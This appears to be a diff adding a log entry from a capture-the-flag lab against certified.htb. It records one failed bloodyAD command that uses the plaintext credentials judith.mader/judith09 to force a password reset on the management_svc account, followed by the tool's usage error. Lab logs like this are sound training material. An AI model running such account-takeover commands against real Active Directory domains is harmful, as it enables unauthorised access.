@@ -1,0 +1,13 @@
+### [2026-04-05 20:33:10] bloodyAD --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 forceChangePassword management_svc NewPass123!
+
+$ bloodyAD --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 forceChangePassword management_svc NewPass123!
+
+usage: bloodyAD [-h] [-d DOMAIN] [-u USERNAME] [-p PASSWORD]
+                [-k [KERBEROS ...]] [-f {b64,hex,aes,rc4,default}]
+                [-c [CERTIFICATE]] [-s] [--host HOST] [--dc-ip DC_IP]
+                [--dns DNS] [--gc] [-v {QUIET,INFO,DEBUG}]
+                {add,get,remove,set} ...
+bloodyAD: error: argument {add,get,remove,set}: invalid choice: 'forceChangePassword' (choose from add, get, remove, set)
+
+# Exit code: 2
+# Duration: 2026-04-05 20:33:10
